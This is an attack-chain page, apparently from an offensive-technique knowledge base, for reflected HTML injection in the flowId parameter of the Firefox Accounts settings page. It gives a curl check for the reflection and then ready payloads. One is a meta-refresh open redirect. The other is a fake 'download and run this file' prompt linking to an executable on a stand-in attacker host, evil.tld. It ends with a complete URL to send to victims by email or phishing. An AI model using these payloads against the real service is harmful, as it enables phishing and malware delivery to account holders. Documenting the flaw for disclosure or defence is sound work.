---
id: ac-uuid-1234
name: >-
  Reflected HTML Injection for Open Redirects and UI Redressing on Firefox
  Accounts Settings
tags:
  - html-injection
  - reflected-xss
  - open-redirect
  - ui-redressing
  - phishing
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-FlowId-Parameter-Reflection]]'
  - '[[procedures/Craft-Malicious-HTML-Injection-Payloads]]'
  - '[[procedures/Deliver-Malicious-URL-to-Victim]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T03:47:23.626Z'
description: >-
  A multi-stage attack exploiting reflected HTML injection in the flowId
  parameter to perform open redirects and UI redressing, bypassing CSP
  restrictions on JavaScript execution.
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
---
# Reflected HTML Injection for Open Redirects and UI Redressing on Firefox Accounts Settings

Multi-stage attack chain demonstrating a complete attack workflow exploiting HTML injection in the flowId parameter on Firefox Accounts settings page.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Reflection] --> B[Craft Payloads]
    B --> C[Deliver to Victim]
    C --> D[Exploit for Redirect/Phishing]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser developer tools for inspection
- URL encoder (e.g., built-in browser or online tool)

### Target Environment

- Web platform
- Access to https://accounts.firefox.com/settings
- No authentication required for the endpoint

### Initial Access Requirements

- Public internet access
- Ability to craft and share URLs
- No prior credentials needed

## Detailed Attack Procedures

### Step 1: Identify Reflection
procedure: [[procedures/Identify-FlowId-Parameter-Reflection]]

**Objective**: Confirm the flowId parameter is reflected without escaping in the HTML response.

**Instructions**: Access the endpoint using [[commands/curl-fetch-settings]] to observe the response:

```bash
curl "https://accounts.firefox.com/settings?flowId=test123" -v
```

Inspect the HTML output for the unescaped 'test123' insertion, indicating injection potential.

**Expected Output**: HTML response showing direct insertion of flowId value.

**Success Indicators**:
- Parameter value echoed in HTML without encoding
- No script blocking observed for HTML tags

### Step 2: Craft Payloads
procedure: [[procedures/Craft-Malicious-HTML-Injection-Payloads]]

**Objective**: Develop payloads for open redirects or UI redressing that bypass CSP.

**Instructions**: Encode payloads for URL use. For open redirect, use [[commands/echo-payload]] to generate:

```bash
echo '"'><meta http-equiv="refresh" content="1; http://example.com">'
```

Test by appending to URL: https://accounts.firefox.com/settings?flowId=%22%3E%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%221%3B%20http%3A%2F%2Fexample.com%22%3E

For UI redressing: echo 'e587d1d6ceb"><h1>Your machine needs to be analyzed. Please download and run this file to continue: <a href="http://evil.tld/a.exe">Click here to Download</a></h1><!--'

**Expected Output**: Payload renders HTML elements like meta redirect or fake UI prompts.

**Success Indicators**:
- HTML tags execute (e.g., redirect occurs)
- No JS errors from CSP

### Step 3: Deliver URL
procedure: [[procedures/Deliver-Malicious-URL-to-Victim]]

**Objective**: Trick victim into visiting the injected URL to trigger the attack.

**Instructions**: Construct full URL with payload, e.g., using [[commands/construct-url]]:

```bash
echo "https://accounts.firefox.com/settings?deviceId=cc10a15a5ac94bdf8a9a0bc5b2912520&flowBeginTime=1676972087857&flowId=%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%221;%20http://example.com%22%3E&broker=web&context=web&isSampledUser=false&service=none&uniqueUserId=dbf23f86-d3d1-4576-92bc-ebaa4fd14795"
```

Share via email, social engineering, or phishing site.

**Expected Output**: Victim's browser renders injected HTML, performing redirect or displaying phishing UI.

**Success Indicators**:
- Victim redirected to attacker site
- Interaction with malicious content (e.g., click on fake download)

## Attack Chain Summary

### Key Achievements

1. Confirmed HTML injection vulnerability without JS execution.
2. Demonstrated open redirects and UI redressing for phishing.
3. Highlighted potential data leakage risks via CSP connect-src to localhost:4318.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Drive-by Compromise]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
